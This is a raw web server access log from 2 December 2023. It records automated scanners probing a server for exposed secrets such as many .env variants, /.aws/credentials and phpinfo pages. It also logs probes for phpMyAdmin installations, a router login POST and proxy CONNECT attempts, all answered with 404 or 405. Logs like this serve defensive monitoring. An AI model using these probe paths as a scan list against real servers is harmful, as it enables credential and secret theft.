3.10.24.130 - - [02/Dec/2023:09:23:02 +0000] "GET /cgi-bin/login.cgi HTTP/1.1" 404 6813 "-" "'Cloud mapping experiment. Contact research@pdrlabs.net'"
3.10.24.130 - - [02/Dec/2023:09:24:17 +0000] "\x16\x03\x01" 400 483 "-" "-"
205.210.31.89 - - [02/Dec/2023:09:24:58 +0000] "GET / HTTP/1.0" 200 28656 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
3.10.24.130 - - [02/Dec/2023:09:25:04 +0000] "GET /logon.htm HTTP/1.1" 404 6813 "-" "'Cloud mapping experiment. Contact research@pdrlabs.net'"
3.10.24.130 - - [02/Dec/2023:09:26:24 +0000] "\x16\x03\x01" 400 483 "-" "-"
3.10.24.130 - - [02/Dec/2023:09:27:12 +0000] "GET /login.jsp HTTP/1.1" 404 6813 "-" "'Cloud mapping experiment. Contact research@pdrlabs.net'"
3.10.24.130 - - [02/Dec/2023:09:28:33 +0000] "\x16\x03\x01" 400 483 "-" "-"
3.10.24.130 - - [02/Dec/2023:09:29:24 +0000] "GET / HTTP/1.1" 200 8259 "-" "'Cloud mapping experiment. Contact research@pdrlabs.net'"
54.183.164.142 - - [02/Dec/2023:09:34:29 +0000] "GET / HTTP/1.1" 200 8278 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"
135.125.246.189 - - [02/Dec/2023:09:36:55 +0000] "GET /.env HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [02/Dec/2023:09:36:55 +0000] "POST / HTTP/1.1" 405 1026574 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.79.181.251 - - [02/Dec/2023:09:48:57 +0000] "\x16\x03\x01" 400 483 "-" "-"
90.151.171.106 - - [02/Dec/2023:10:10:46 +0000] "CONNECT checkip.amazonaws.com:443 HTTP/1.1" 404 6813 "-" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from) Z75720595780Q1"
90.151.171.106 - - [02/Dec/2023:10:10:57 +0000] "GET http://checkip.amazonaws.com?Z75720595780Q1 HTTP/1.1" 404 6832 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
34.77.127.183 - - [02/Dec/2023:10:28:26 +0000] "GET / HTTP/1.1" 200 8315 "-" "python-requests/2.31.0"
44.234.87.135 - - [02/Dec/2023:10:29:27 +0000] "GET /phpinfo.php HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:27 +0000] "GET /info.php HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:28 +0000] "GET /phpinfo HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:28 +0000] "GET /php.php HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:28 +0000] "GET /php_info.php HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:28 +0000] "GET /phptest.php HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:28 +0000] "GET /dashboard/phpinfo.php HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:28 +0000] "GET /infophp.php HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:28 +0000] "GET /p.php HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:28 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:28 +0000] "GET /info.php HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:28 +0000] "GET /pinfo.php HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:28 +0000] "GET /scripts/phpinfo.php HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:28 +0000] "GET /phpinfo.php HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:28 +0000] "GET /admin/phpinfo.php HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:28 +0000] "GET /phpinfo/phpinfo.php HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:28 +0000] "GET /information.php HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:28 +0000] "GET /information HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:28 +0000] "GET /phpinformation HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:28 +0000] "GET /php-info.php HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:28 +0000] "GET /phpversion.php HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:28 +0000] "GET /webdav/phpinfo.php HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:29 +0000] "GET /webdav/phpinfo HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:29 +0000] "GET /webdav/info.php HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:29 +0000] "GET /testphpinfo.php HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:29 +0000] "GET /testphpinfo HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:29 +0000] "GET /admin.php HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:29 +0000] "GET /_phpinfo.php HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:29 +0000] "GET /PHPConf.php HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:29 +0000] "GET /viewinfo.php HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:29 +0000] "GET /info/phpinfo.php HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:29 +0000] "GET /info/info.php HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:29 +0000] "GET /.env HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:29 +0000] "GET /.env.save HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:29 +0000] "GET /.env.old HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:29 +0000] "GET /.env.prod HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:29 +0000] "GET /.env.production HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:29 +0000] "GET /.env.development HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:29 +0000] "GET /laravel/.env HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:29 +0000] "GET /admin-app/.env HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:29 +0000] "GET /api/.env HTTP/1.1" 404 6901 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:30 +0000] "GET /app/.env HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:30 +0000] "GET /development/.env HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:30 +0000] "GET /apps/.env HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:30 +0000] "GET /.aws/credentials HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:30 +0000] "GET /private/.env HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:30 +0000] "GET /system/.env HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:30 +0000] "GET /docker/.env HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:30 +0000] "GET /cms/.env HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:30 +0000] "GET /script/.env HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:30 +0000] "GET /live_env HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:30 +0000] "GET /application/.env HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:30 +0000] "GET /.env.project HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:30 +0000] "GET /.env.dist HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:30 +0000] "GET /back/.env HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:30 +0000] "GET /core/.env HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:30 +0000] "GET /docker/.env HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:30 +0000] "GET /fedex/.env HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:30 +0000] "GET /local/.env HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:30 +0000] "GET /rest/.env HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:31 +0000] "GET /shared/.env HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:31 +0000] "GET /sources/.env HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:31 +0000] "GET /enviroments/.env.production HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:31 +0000] "GET /enviroments/.env HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
44.234.87.135 - - [02/Dec/2023:10:29:31 +0000] "POST / HTTP/1.1" 405 1026570 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [02/Dec/2023:11:01:13 +0000] "GET /.env HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [02/Dec/2023:11:01:13 +0000] "POST / HTTP/1.1" 405 1026574 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
199.45.155.35 - - [02/Dec/2023:11:03:53 +0000] "GET / HTTP/1.1" 200 28640 "-" "-"
199.45.155.35 - - [02/Dec/2023:11:03:58 +0000] "GET / HTTP/1.1" 200 8259 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
199.45.155.35 - - [02/Dec/2023:11:03:59 +0000] "PRI * HTTP/2.0" 400 483 "-" "-"
199.45.155.35 - - [02/Dec/2023:11:04:01 +0000] "GET /favicon.ico HTTP/1.1" 200 259 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
1.14.7.100 - - [02/Dec/2023:11:07:36 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
54.183.164.142 - - [02/Dec/2023:11:08:51 +0000] "GET / HTTP/1.1" 200 8278 "-" "Mozilla/5.0 (Linux; Android 9; SM-A530F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
194.233.83.117 - - [02/Dec/2023:11:20:22 +0000] "GET /.env HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
194.233.83.117 - - [02/Dec/2023:11:20:23 +0000] "POST / HTTP/1.1" 405 1026574 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.227.129.62 - - [02/Dec/2023:11:39:43 +0000] "GET / HTTP/1.1" 200 28659 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
135.125.246.189 - - [02/Dec/2023:12:10:22 +0000] "GET /.env HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [02/Dec/2023:12:10:23 +0000] "POST / HTTP/1.1" 405 1026574 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.180.143.49 - - [02/Dec/2023:12:34:41 +0000] "GET / HTTP/1.1" 200 8259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.180.143.49 - - [02/Dec/2023:12:34:42 +0000] "GET /cf_scripts/scripts/ajax/ckeditor/ckeditor.js HTTP/1.1" 404 6813 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
1.14.7.100 - - [02/Dec/2023:13:13:46 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
135.125.246.189 - - [02/Dec/2023:13:21:19 +0000] "GET /.env HTTP/1.1" 404 6869 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [02/Dec/2023:13:21:19 +0000] "POST / HTTP/1.1" 405 1026574 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
90.151.171.106 - - [02/Dec/2023:13:50:24 +0000] "CONNECT fingerprints.bablosoft.com:443 HTTP/1.1" 404 6813 "-" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from) Z75720595780Q1"
90.151.171.106 - - [02/Dec/2023:13:50:34 +0000] "GET http://fingerprints.bablosoft.com/ip?Z75720595780Q1 HTTP/1.1" 404 6832 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
80.79.117.42 - - [02/Dec/2023:13:57:14 +0000] "GET / HTTP/1.0" 200 28656 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
31.7.58.42 - - [02/Dec/2023:14:43:34 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 6869 "http://52.53.240.195:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
176.97.210.240 - - [02/Dec/2023:14:57:20 +0000] "GET / HTTP/1.1" 200 28640 "-" "Go-http-client/1.1"
90.151.171.108 - - [02/Dec/2023:15:17:53 +0000] "CONNECT checkip.amazonaws.com:443 HTTP/1.1" 404 6813 "-" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from) Z75720595780Q1"
90.151.171.108 - - [02/Dec/2023:15:18:03 +0000] "GET http://checkip.amazonaws.com?Z75720595780Q1 HTTP/1.1" 404 6832 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
201.168.160.141 - - [02/Dec/2023:15:29:25 +0000] "GET /admin/web/index.php?lang=en HTTP/1.1" 404 6813 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
201.168.160.141 - - [02/Dec/2023:15:29:25 +0000] "GET /mysql/pMA/index.php?lang=en HTTP/1.1" 404 6813 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
201.168.160.141 - - [02/Dec/2023:15:29:25 +0000] "GET /shopdb/index.php?lang=en HTTP/1.1" 404 6813 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
201.168.160.141 - - [02/Dec/2023:15:29:25 +0000] "GET /program/index.php?lang=en HTTP/1.1" 404 6813 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
201.168.160.141 - - [02/Dec/2023:15:29:25 +0000] "GET /phpmyadmin1/index.php?lang=en HTTP/1.1" 404 6813 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
201.168.160.141 - - [02/Dec/2023:15:29:25 +0000] "GET /phpmyadmin2020/index.php?lang=en HTTP/1.1" 404 6813 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
201.168.160.141 - - [02/Dec/2023:15:29:25 +0000] "GET /phpmyadmin2019/index.php?lang=en HTTP/1.1" 404 6813 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
201.168.160.141 - - [02/Dec/2023:15:29:25 +0000] "GET /mysql/pma/index.php?lang=en HTTP/1.1" 404 6813 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
201.168.160.141 - - [02/Dec/2023:15:29:25 +0000] "GET /db/phpmyadmin/index.php?lang=en HTTP/1.1" 404 6813 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
201.168.160.141 - - [02/Dec/2023:15:29:25 +0000] "GET /phpmyadmin2016/index.php?lang=en HTTP/1.1" 404 6813 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
201.168.160.141 - - [02/Dec/2023:15:29:26 +0000] "GET /phpMyAdmin-4.9.10-all-languages/index.php?lang=en HTTP/1.1" 404 6813 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
201.168.160.141 - - [02/Dec/2023:15:29:26 +0000] "GET /phpmyadmin2012/index.php?lang=en HTTP/1.1" 404 6813 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
201.168.160.141 - - [02/Dec/2023:15:29:26 +0000] "GET /2phpmyadmin/index.php?lang=en HTTP/1.1" 404 6813 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
201.168.160.141 - - [02/Dec/2023:15:29:26 +0000] "GET /sql/sql-admin/index.php?lang=en HTTP/1.1" 404 6813 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
201.168.160.141 - - [02/Dec/2023:15:29:26 +0000] "GET /phpMyAdmin-latest-english/index.php?lang=en HTTP/1.1" 404 6813 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
